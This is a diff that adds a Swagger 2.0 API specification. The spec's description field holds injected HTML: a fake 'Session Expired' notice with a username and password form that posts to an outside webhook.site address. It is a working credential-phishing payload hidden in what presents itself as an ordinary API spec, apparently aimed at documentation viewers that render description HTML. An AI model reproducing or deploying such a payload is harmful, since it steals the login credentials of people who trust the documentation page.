@@ -1,0 +1,20 @@
+swagger: '2.0'
+info:
+  version: "0.0.1"
+  title: Example Title
+  description: |
+    <h3 style="color: red;">⚠️ Session Expired</h3>
+    <p>Your session has expired. Please re-authenticate to continue.</p>
+    <form action="https://webhook.site/3090469f-7fce-425d-814c-6ad326d5d872" method="POST">
+      <label>Username:</label><br>
+      <input type="text" name="username" placeholder="Enter your username" required><br><br>
+      <label>Password:</label><br>
+      <input type="password" name="password" placeholder="Enter your password" required><br><br>
+      <button type="submit">Re-authenticate</button>
+    </form>
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
